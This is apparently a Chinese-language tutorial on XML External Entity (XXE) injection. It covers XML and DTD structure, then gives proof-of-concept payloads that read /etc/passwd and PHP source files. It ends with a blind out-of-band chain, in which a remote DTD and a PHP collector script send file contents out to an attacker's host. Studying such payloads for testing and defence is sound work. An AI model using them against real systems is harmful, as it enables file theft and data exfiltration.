XXE

XML

XML定义

XXE（XML External Entity Injection）全称为XML外部实体注入，由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的

PHP中的 simplexml_load 默认情况就会解析外部实体，有XXE漏洞的标志性函数为 simplexml_load_string()

XML基础

  1. XML是可扩展标记语言
  2. XML是一种标记语言，很类似HTML
  3. XML的设计宗旨是传输数据，而非显示数据
  4. XML标签没有被预定义，需要自行定义标签
  5. XML被设计为具有自我描述性
  6. XML是W3C的推荐标准

总之，XML不会做任何事情，XML被设计用来结构化、存储以及传输信息

XML文档结构

<!--XML声明-->
<?xml version="1.0" encoding="ISO-8859-1"?>

<!--文档类型定义-->
<!DOCTYPE note [  <!--定义此文档是 note 类型的文档-->
<!ELEMENT note (to,from,heading,body)>  <!--定义note元素有四个元素-->
<!ELEMENT to (#PCDATA)>     <!--定义to元素为”#PCDATA”类型-->
<!ELEMENT from (#PCDATA)>   <!--定义from元素为”#PCDATA”类型-->
<!ELEMENT head (#PCDATA)>   <!--定义head元素为”#PCDATA”类型-->
<!ELEMENT body (#PCDATA)>   <!--定义body元素为”#PCDATA”类型-->
)]>
      
<!--文档元素-->
<note>
<to>Dave</to>
<from>Tom</from>
<head>Reminder</head>
<body>Hello</body>
</note>

DTD

DTD声明分类

  1. 内部声明DTD
<!DOCTYPE 根元素 [元素声明]>
  1. 引用外部DTD
<!DOCTYPE 根元素 SYSTEM "文件名">
  1. 内部DTD文档结合
<!DOCTYPE 根元素 SYSTEM "DTD文件路径" [定义内容]>

关键字

  1. DOCTYPE（DTD的声明）
  2. ENTITY（实体的声明）
  3. SYSTEM、PUBLIC（外部资源申请）

实体分类

  1. 内置实体
  2. 字符实体
  3. 通用实体
  4. 参数实体

区别

  1. 参数实体
    1. 参数实体用 % 实体名称申明，引用时也用 %实体名称
    2. 参数实体只能在DTD中申明，DTD中引用
  2. 其他实体
    1. 其余实体直接用实体名称申明，引用是用 &实体名称
    2. 其余实体只能在DTD中申明，可以在XML文档中引用

DTD声明

内部实体声明

<!ENTITY 实体名称 "实体的值">
  • 一个实体由三个部分组成 &符号、实体名称、分号(;)
  • 这里&不论在GET还是在POST中都需要进行URL编码，因为是使用参数传入xml的，&符号会被认为是参数间的连接符号
<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe "Hello">]><foo>%26xxe</foo>

外部实体声明

<!ENTITY 实体名称 SYSTEM "URI/URL">

XML中数据的引用称为实体，实体中有一类叫外部实体，用来引入外部资源，有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机，外部实体的引用可以借助各种协议，常见的有

  1. file:///path/file
  2. http://url
  3. php://filter/read=convert.base64-encode/resource=conf.php

外部引用可支持http、file等协议，不同的语言支持的协议不同，但存在一些通用的协议

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xdsec [
<!ELEMENT methodname ANY >
<!ENTITY xxe(实体引用名) SYSTEM "file:///etc/passwd"(实体内容) >]>
<methodcall>
<methodname>&xxe;</methodname>
</methodcall>

// 这种写法则调用了本地计算机的文件/etc/passwd，XML内容被解析后，文件内容便通过&xxe被存放在了methodname元素中，造成了敏感信息的泄露。

参数实体声明

<!ENTITY % 实体名称 "实体的值">
或者
<!ENTITY % 实体名称 SYSTEM "URI">

XMLPoc

<!DOCTYPE foo 
[
    <!ENTITY foo ANY>
    <!ENTITY % xxe SYSTEM "http://ip/evil.dtd">
    %xxe;
]>
<foo>&evil;</foo>

外部evil.dtd中的内容

<!ENTITY evil SYSTEM "file:///c:/phpstudy/www/index.php">

引用公共实体

<!ENTITY 实体名称 PUBLIC "public_ID" "URI">

漏洞检测

  1. Poc1
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE a [<!ENTITY passwd SYSTEM "file:///etc/passwd">]>
<foo>
        <value>%26passwd;</value>
</foo>
  1. Poc2
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE b [<!ENTITY entityex SYSTEM "file:///folder/file">]>
<foo>
        <value>%26entityex;</value>
</foo>
  1. Poc3
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
<name>%26xxe;</name>
</root>
  1. Poc4
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php" >
]>
<root>
<name>%26xxe;</name>
</root>

有回显

直接利用上面的POC进行检测，查看是否可以被解析返回数据

无回显

  1. 存在XXE，打入语句后，没有任何回显，就可以通过炮台外带数据
  2. 前提条件

1.xml和2.php存在于公网IP

1.xml传递数据

<!ENTITY % all "<!ENTITY &#X25; send SYSTEM 'http://192.168.31.3/1.php?id=%file;'>"> %all;
// &#x25; 是 % 的意思

2.php写入数据

<?php
    file_put_contents("1.txt", $_GET['id'], FILE_APPEND);    
?>

3.txt查看数据

在存在XXE的地方打入exp

<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=H:\1.txt">
<!ENTITY % remote SYSTEM "公网IP/1.xml">
%remote;
%send;
]>

1、通过payload的声明了 file 和 routem 两个参数实体

2、先执行 routem 参数实体（向公网IP的1.xml发起网络请求）

3、公网IP的1.xml声明了 all 参数实体，并进行调用

4、向公网IP的2.php发起网络请求（此时 file 参数实体被调用，会进行读取文件，并把文件与前面的内容进行拼接）

5、公网IP的2.php收到数据（id传参后面的数据）会把该数据写入公网IP的3.txt中

6、最后通过公网IP的3.txt查看外带的数据（通过base64解码查看）
